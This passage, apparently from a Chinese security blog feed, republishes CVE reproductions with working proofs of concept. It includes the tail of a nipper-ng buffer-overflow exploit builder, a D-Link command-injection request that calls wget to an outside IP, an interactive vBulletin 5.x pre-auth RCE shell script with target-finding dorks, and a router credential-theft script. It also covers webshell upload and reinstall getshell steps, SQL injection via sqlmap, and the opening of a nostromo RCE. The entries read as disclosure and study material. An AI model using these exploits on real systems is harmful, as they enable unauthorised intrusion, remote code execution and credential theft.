class="line">        exploit[OFFSET_FOR_SHELL_COMMAND+i] &#x3D; ord(letter)</span><br><span class="line"></span><br><span class="line">    return exploit</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        print(f&quot;usage: &#123;sys.argv[0]&#125; &lt;shell command to execute&gt; &lt;output file&gt;&quot;)</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload &#x3D; build_exploit(sys.argv[1])</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;error building exploit: &#123;e&#125;&quot;)</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">    open(sys.argv[2], &quot;wb&quot;).write(payload)</span><br><span class="line"></span><br><span class="line">    return 0 # success</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br><span class="line">            </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> nipper-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link路由器曝出RCE漏洞，牵涉多个型号</title>
      <link href="2021/01/20/CVE-2019-16920-D-Link-rce/"/>
      <url>2021/01/20/CVE-2019-16920-D-Link-rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#x43;&#x61;&#116;&#87;&#70;&#x59;&#x40;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#74;&#111;&#x43;&#x61;&#116;&#87;&#70;&#x59;&#x40;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p><h2 id="D-Link路由器曝出RCE漏洞，牵涉多个型号"><a href="#D-Link路由器曝出RCE漏洞，牵涉多个型号" class="headerlink" title="D-Link路由器曝出RCE漏洞，牵涉多个型号"></a>D-Link路由器曝出RCE漏洞，牵涉多个型号</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>Fortinet旗下FortiGuard实验室的研究人员披露了D-Link路由器上的一个远程命令执行漏洞，牵涉多个型号  </p></blockquote><h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><blockquote><p><a href="https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html">https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html</a><br><a href="https://nosec.org/home/detail/3020.html">https://nosec.org/home/detail/3020.html</a>  </p></blockquote><h3 id="根据作者披露的受影响型号为："><a href="#根据作者披露的受影响型号为：" class="headerlink" title="根据作者披露的受影响型号为："></a>根据作者披露的受影响型号为：</h3><ul><li>DIR-655</li><li>DIR-866L</li><li>DIR-652</li><li>DHP-1565</li></ul><h2 id="POC-如下"><a href="#POC-如下" class="headerlink" title="POC 如下"></a>POC 如下</h2><blockquote><p>攻击者可以利用该漏洞将任意字符串发送到“PingTest”网关接口来实现命令注入。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;apply_sec.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.232.128</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko&#x2F;20100101 Firefox&#x2F;69.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: vi-VN,vi;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 131</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.232.128&#x2F;login_pic.asp</span><br><span class="line">Cookie: uid&#x3D;1234123</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">html_response_page&#x3D;login_pic.asp&amp;action&#x3D;ping_test&amp;ping_ipaddr&#x3D;127.0.0.1%0awget%20-P%20&#x2F;tmp&#x2F;%20http:&#x2F;&#x2F;45.76.148.31:4321&#x2F;?$(echo 1234)</span><br></pre></td></tr></table></figure><blockquote><p>“该漏洞始于一次错误的身份验证过程。当我们要进入管理页面时，需要执行登录操作。此时，我们会对<code>apply_sec.cgi</code>页面发出<code>POST</code>请求，其中包含一个操作<code>ping_test</code>。研究后发现，我们可通过参数<code>ping_ipaddr</code>执行命令注入。虽然响应是返回登录页面，但操作<code>ping_test</code>仍然执行了，我们通过参数<code>ping_ipaddr</code>注入的命令<code>echo 1234</code>成功执行，并将结果发送回我们的服务器。” </p><p><a href="https://imgchr.com/i/sfQDvF"><img src="https://s3.ax1x.com/2021/01/20/sfQDvF.md.png" alt="sfQDvF.md.png"></a></p><p><strong>专家们发现，由于糟糕的身份权限检查，即使无用户权限，也可以远程执行命令。</strong></p></blockquote><blockquote><p>研究人员在9月22日向D-Link报告了漏洞，而厂商在两天后承认漏洞存在，并在三天后确认不会发布相关补丁，因为这些产品都已经到了生命周期的终点。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 硬件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> POC </tag>
            
            <tag> D-Link路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit</title>
      <link href="2021/01/20/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/"/>
      <url>2021/01/20/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#97;&#x74;&#87;&#x46;&#x59;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#74;&#111;&#67;&#97;&#x74;&#87;&#x46;&#x59;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit ，无需预认证即可执行远程代码执行漏洞 </p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>不需要在目标论坛上注册帐户,即可在运行vBulletin安装的服务器上执行shell命令 </p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>vBulletin 5.x </p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>vBulletin v5（5.0.0到5.5.4）版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>vBulletin  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># vBulletin 5.x 0day pre-auth RCE exploit</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># This should work on all versions from 5.0.0 till 5.5.4</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Google Dorks:</span></span><br><span class="line"><span class="comment"># - site:*.vbulletin.net</span></span><br><span class="line"><span class="comment"># - &quot;Powered by vBulletin Version 5.5.4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    sys.exit(<span class="string">&quot;Usage: %s &lt;URL to vBulletin&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">proxies =&#123;</span><br><span class="line">     <span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;<span class="string">&quot;routestring&quot;</span>:<span class="string">&quot;ajax/render/widget_php&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">          cmd = raw_input(<span class="string">&quot;&gt;&gt;&gt;Shell= &quot;</span>)</span><br><span class="line">          params[<span class="string">&quot;widgetConfig[code]&quot;</span>] = <span class="string">&quot;echo shell_exec(&#x27;&quot;</span>+cmd+<span class="string">&quot;&#x27;);echo md5(&#x27;vBulletin&#x27;); exit;&quot;</span></span><br><span class="line">          r = requests.post(url = sys.argv[<span class="number">1</span>], data = params, proxies=proxies)</span><br><span class="line">          <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">or</span> r.status_code ==<span class="number">403</span> <span class="keyword">and</span> <span class="string">&#x27;be4ea51d962be8308a0099ae1eb3ec63&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">               <span class="built_in">print</span></span><br><span class="line">               <span class="built_in">print</span> r.text.split(<span class="string">&#x27;be4ea51d962be8308a0099ae1eb3ec63&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">               sys.exit(<span class="string">&quot;Exploit failed! :(&quot;</span>)</span><br><span class="line">     <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          sys.exit(<span class="string">&quot;\nClosing shell...&quot;</span>)</span><br><span class="line">     <span class="keyword">except</span> Exception, e:</span><br><span class="line">          sys.exit(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="复现截图"><a href="#复现截图" class="headerlink" title="复现截图"></a>复现截图</h3><p><a href="https://imgchr.com/i/sfKgsJ"><img src="https://s3.ax1x.com/2021/01/20/sfKgsJ.png" alt="sfKgsJ.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> 远程代码执行 </tag>
            
            <tag> vBulletin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-16314 indexhibit cms v2.1.5 存在重装并导致getshell</title>
      <link href="2021/01/20/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/"/>
      <url>2021/01/20/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#97;&#116;&#x57;&#x46;&#x59;&#x40;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#x6d;">&#74;&#111;&#67;&#97;&#116;&#x57;&#x46;&#x59;&#x40;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#x6d;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-16314 indexhibit cms v2.1.5 存在重装并导致getshell</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>夜程 发现indexhibit cms v2.1.5 存在重装并导致getshell 漏洞</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>如果没有删除 install.php 则可以通过直接提交参数进行重装，并在后台直接getshell</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>indexhibit cms</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>indexhibit cms  v2.1.5 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>indexhibit cms  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问/ndxzstudio/install.php，提示已安装</p><p><a href="https://imgchr.com/i/sfK3Pf"><img src="https://s3.ax1x.com/2021/01/20/sfK3Pf.png" alt="sfK3Pf.png"></a></p><p>但是，通过参数p可以绕过，直接重新安装</p><p><a href="https://imgchr.com/i/sfK8G8"><img src="https://s3.ax1x.com/2021/01/20/sfK8G8.png" alt="sfK8G8.png"></a></p><p>填写相关信息后安装成功：</p><p><a href="https://imgchr.com/i/sfKGRS"><img src="https://s3.ax1x.com/2021/01/20/sfKGRS.png" alt="sfKGRS.png"></a></p><h2 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h2><blockquote><p>/ndxzstudio/install.php?p=2</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> 重装漏洞 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发现OKLite v1.2.25 存在任意文件上传漏洞（需要登录后台）</title>
      <link href="2021/01/20/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/20/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#67;&#x61;&#x74;&#x57;&#70;&#x59;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;">&#x4a;&#x6f;&#67;&#x61;&#x74;&#x57;&#70;&#x59;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OKLite v1.2.25 存在任意文件上传漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现OKLite v1.2.25 存在任意文件上传漏洞（需要登录后台）</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>直接上传getshell</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>OKLite</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>OKLite v1.2.25 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>OKLite  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台，点击模块管理<br><img src="https://i.loli.net/2021/01/17/QEXgdsDBR9ubMTk.png" alt="16.png"></p><p>编辑一个测试文件test.php,压缩为test.zip上传。<br><img src="https://i.loli.net/2021/01/17/iVM9RySl7WGBzEq.png" alt="17.png"></p><p>然后导入模块</p><p><img src="https://i.loli.net/2021/01/20/zbu3moweZQiTKkR.png" alt="18.png"></p><p>点击开始上传，上传shell生成在解压主目录下面</p><p><img src="https://i.loli.net/2021/01/20/9bOg7XzyeILcsHl.png" alt="19.png"></p><p><img src="https://i.loli.net/2021/01/20/2UkxOHsDvPEWyac.png" alt="20.png"></p><p>访问<code>http://127.0.0.1:8888/1.2.25/data/cache/test.php</code></p><p><img src="https://i.loli.net/2021/01/20/j4ebifSCqXMaRZr.png" alt="21.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> OKLite v1.2.25 </tag>
            
            <tag> 任意文件上传 </tag>
            
            <tag> CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蜂网互联企业级路由器v4.31密码泄露漏洞</title>
      <link href="2021/01/20/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/20/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#x46;&#89;&#64;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;">&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#x46;&#89;&#64;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>蜂网互联企业级路由器v4.31密码泄露漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>蜂网互联企业级路由器v4.31密码泄露漏洞,密码<code>hash</code>直接存放在网页源码里</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>蜂网互联企业级路由器v4.31密码泄露,可直接接管路由器</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>蜂网互联企业级路由器</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>蜂网互联企业级路由器v4.31  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>蜂网互联企业级路由器v4.31  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://i.loli.net/2021/01/20/ceECk7PBGxyfKJW.png" alt="31.png"></p><p>访问/index.htm?PAGE=web链接，此链接未授权访问（里面的操作需要认证）：</p><p><img src="https://i.loli.net/2021/01/20/VQd7WMbmrfADwJP.png" alt="32.png"></p><p>选择`web账号管理：<br>查看源代码即可获取到登录密码的哈希值：</p><p><img src="https://i.loli.net/2021/01/20/O8Pth2aTWE9UsfF.png" alt="33.png"></p><p>解密哈希即可获得密码：</p><p><img src="https://i.loli.net/2021/01/20/AbpgXPrCnsjfQLx.png" alt="34.png"></p><p>/login.html从此链接登录系统：</p><p><img src="https://i.loli.net/2021/01/20/m3Hra9Tuv2szgq4.png" alt="35.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpass</span>(<span class="params">target</span>):</span></span><br><span class="line">    r = requests.get( target + <span class="string">&#x27;/action/usermanager.htm&#x27;</span>)</span><br><span class="line">    <span class="comment">#return r.text</span></span><br><span class="line">    s=json.loads(r.text)</span><br><span class="line">    s=<span class="built_in">str</span>(s[<span class="string">&#x27;rows&#x27;</span>])</span><br><span class="line">    s=s.replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    s=s.replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    s=s.replace(<span class="string">&quot;\&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">    s2=json.loads(s)</span><br><span class="line">    print(<span class="string">&quot;账号:&quot;</span>+s2[<span class="string">&#x27;user&#x27;</span>]+<span class="string">&quot;，密码:&quot;</span>+s2[<span class="string">&#x27;pwd&#x27;</span>]+<span class="string">&quot;\n登录地址为:&quot;</span>+target+<span class="string">&quot;/login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usage = <span class="string">&quot;usage: python3 %prog -t 目标(格式：http://1.1.1.1)&quot;</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, dest=<span class="string">&#x27;target&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;目标ip&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    target = options.target</span><br><span class="line">    <span class="keyword">if</span> target:</span><br><span class="line">        getpass(target)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/20/qz8RmTfUuSo1eCd.png" alt="36.png"></p>]]></content>
      
      
      <categories>
          
          <category> 硬件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> 密码泄露 </tag>
            
            <tag> 路由器 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-16309 FlameCMS 3.3.5 后台登录处存在sql注入漏洞</title>
      <link href="2021/01/20/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/20/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#111;&#67;&#x61;&#116;&#x57;&#x46;&#89;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;">&#x4a;&#111;&#67;&#x61;&#116;&#x57;&#x46;&#89;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-16309 FlameCMS 3.3.5 后台登录处存在sql注入漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现FlameCMS 3.3.5 后台登录处存在sql注入漏洞</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>后台登录处存在sql注入漏洞，可以通过<code>sqlmap</code>直接跑出所有表</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>FlameCMS</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>FlameCMS 3.3.5 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>FlameCMS  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问后台登陆处抓包<code>http://127.0.0.1:8888/FlameCMS-master/account/login.php</code></p><p><img src="https://i.loli.net/2021/01/20/OfgmAnSPhsK9l5F.png" alt="27.png"></p><p>然后把抓取的post包，放进sqlmap跑，成功使用盲注跑出</p><p><img src="https://i.loli.net/2021/01/20/AP1OqHEwBzWuUkC.png" alt="28.png"></p><p><img src="https://i.loli.net/2021/01/20/OlPN4UDcK9xzLHI.png" alt="29.png"></p><p><img src="https://i.loli.net/2021/01/20/EybzVUmBP53xndY.png" alt="30.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> sql注入漏洞 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd</title>
      <link href="2021/01/20/CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd/"/>
      <url>2021/01/20/CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#97;&#x74;&#87;&#70;&#x59;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#109;">&#74;&#111;&#67;&#97;&#x74;&#87;&#70;&#x59;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#109;</a></p><h2 id="CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd"><a href="#CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd" class="headerlink" title="CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd"></a>CVE-2019-16278andCVE-2019-16279-about-nostromo-nhttpd</h2><h2 id="0x1-nostromo-nhttpd简介"><a href="#0x1-nostromo-nhttpd简介" class="headerlink" title="0x1.nostromo nhttpd简介"></a>0x1.nostromo nhttpd简介</h2><p>nostromo nhttpd是一款简单，快速的开源Web服务器，其作者是来自瑞士tiefen Boden 7的马库斯·格洛克（Marcus Glocker）。</p><h2 id="0x2-漏洞来源"><a href="#0x2-漏洞来源" class="headerlink" title="0x2.漏洞来源"></a>0x2.漏洞来源</h2><p>10月14日来自hackthebox名人堂第290名精英黑客sp0re公布了 nostromo nhttpd 1.9.6（目前最新版，算是0day吧）及之前版本中的‘http_verify’函数存在路径遍历漏洞CVE-2019-16278和拒绝服务攻击（Dos）CVE-2019-16279 。</p><h2 id="0x3-漏洞详情"><a href="#0x3-漏洞详情" class="headerlink" title="0x3.漏洞详情"></a>0x3.漏洞详情</h2><p>CVE-2019-16278漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素，攻击者可利用该漏洞访问受限目录之外的位置，而且这个漏洞是因为 对CVE-2011-0751漏洞的未完全修复导致攻击者可以利用类似 /../ 的路径格式绕过限制从而通过 /bin/sh 来执行任意参数，即命令执行。<br>例如：  </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./CVE-2019-16278.sh 127.0.0.1 8080 id</span></span><br><span class="line">uid=1001(sp0re) gid=1001(sp0re) 